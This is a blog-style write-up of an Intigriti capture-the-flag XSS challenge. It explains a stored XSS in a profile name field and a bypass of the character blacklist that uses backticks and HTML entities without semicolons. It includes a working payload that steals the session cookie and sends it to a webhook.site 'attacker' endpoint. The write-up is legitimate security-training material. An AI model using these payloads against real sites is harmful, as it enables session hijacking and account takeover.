+++
date = '2026-05-25T17:20:57+02:00'
title = 'Intigriti ctf 0526'
+++


## Task
- Leverage XSS vulnerability on the challenge page.
- Should not be self XSS or related MITM attacks.

## Initial observations
After making an user account and walking the application I found couple POST endpoints which store user input and render it in other places.
- /api/register
- /api/login
- /api/testimonials
- /api/profile

One more note, the session cookie was not HttpOnly, meaning a cookie can be exfiltrated via XSS.

Ignoring the fact that that was beyond the scope of this CTF, with the main flag being just the XSS alert, and the cookie value was just an incrementing integer.

\
Attempting basic XSS would result in this error.

Character blacklist defense also included strings like *script, onerror, onload, javascript*.
```text
SCA Shield: Malicious characters detected! Quotes, parenthesis, dots, commas, and semicolons are strictly forbidden.
```
\
At first I tried to just close the HTML tag of the element in which my payloads are rendered.
```http
POST /api/testimonials HTTP/1.1

{"content":"test</div>"}
```
Response:
```http
HTTP/1.1 200 OK

{"success": true, "uuid": "65c56a72-a5bd-4a0d-b0ca-b71147c603d9"}
```


Now it was time to decide what HTML element will fit this scenario.

Main requirements were:
- Not using blacklisted event attributes or HTML tags.
- No user interaction except initial navigation or link click.

For this I was searching through the *[XSS cheat-sheet from port swigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)*.

\
Eventually I settled on hyperlink anchor tag `<a>`, which allows for *onfocus* event attribute and can be set to *autofocus* which fires the Javascript payload for navigation, and having an URL with suffix *#testimonials* is a way to trigger that focus event. 

\
So for the start *`test</div><a href=x>link</a>`* was a passing and rendering OK.
\
Now it was a matter of figuring out an XSS payload that would bypass the shield defense mechanism.

## Endpoint **/api/profile** has insufficient protection.

For proof of concept, my payload executes a Javascript "**confirm**" pop-up with a message "**intigriti**".

## Filter bypass method

To bypass existing protection against XSS (SCA Shield), I needed to obfuscate parentheses and quotes:

- Instead of using quotes I used backtick character "\`", which functions the same way as quotes do in Javascript.
- And for the parentheses bypass, I used decimal HTML entities \&#40; and \&#41; for closed and open respectively, usually entities need a ";" at the end but that character was rejected so I omitted it, browser likes to complete missing parts on it's own.

Sending the payload in POST request json to update profile **name**:

```json
{"name":"</div><a onfocus=confirm&#40`intigriti`&#41 autofocus tabindex=1>"}
```

Results in stored XSS in community testimonials

[https://challenge-0526.intigriti.io/challenge#testimonials](https://challenge-0526.intigriti.io/challenge#testimonials):

```html
<a onfocus="confirm(`intigriti`)" autofocus="" tabindex="1"></a>
```

If the user is authenticated, upon visiting the URL

[https://challenge-0526.intigriti.io/challenge#testimonials](https://challenge-0526.intigriti.io/challenge#testimonials)

The XSS payload will execute.
![alert screenshot](/blog/images/ctf_alert.png)
## Session takeover payload

Same bypass methodology, blacklisted characters are bypassed by HTML entity decimal encoding without the ";" part.
```html
</div><a onfocus=cookieStore&#46get&#40`session`&#41&#46then&#40function&#40r&#41{fetch&#40`https://webhook&#46site/attacker/?x=`+btoa&#40r&#46value&#41&#41}&#41 autofocus tabindex=1>
```

Just the Javascript payload in readable format no obfuscation:
```js
cookieStore.get('session').then(function(r){fetch(`https://webhook.site/attacker/?x=`+btoa(r.value))})
```
In short, this makes an HTTP request to the attacker controlled server with a URL parameter containing the cookie.
The cookie is base64 encoded for transport.
The attacker will see logged HTTP request in their server logs, with the session cookie.

Using **document.cookie** and "." character was rejected by the server, resulting in this different than usual payload.

This solution is not the intended one, creators intended solution is XSS clobbering.


## Side note

I also randomly tried to set content length header to 0, just to see what happens on this same POST request.
```http
HTTP/1.1 400 Bad Request
Date: Fri, 22 May 2026 12:11:22 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 31
Connection: keep-alive
X-Powered-By: Express
Strict-Transport-Security: max-age=31536000; includeSubDomains

{
    "error": "Content is required"
}
HTTP / 1.1 400 Bad Request
Date: Fri, 22 May 2026 12: 11: 22 GMT
Content - Type: text / html
Content - Length: 150
Connection: close

    <
    html >
    <
    head > < title > 400 Bad Request < /title></head >
    <
    body >
    <
    center > < h1 > 400 Bad Request < /h1></center >
    <
    hr > < center > nginx < /center> <
    /body> <
    /html>
```
It seems that the server managed to concatenate two HTTP responses, I assume the first one which is the usual and second one from the internal requests, I'm not sure.
Maybe there is a descync or request sumuggling vulnerability in here, but I didn't wanna get derailed off the course.
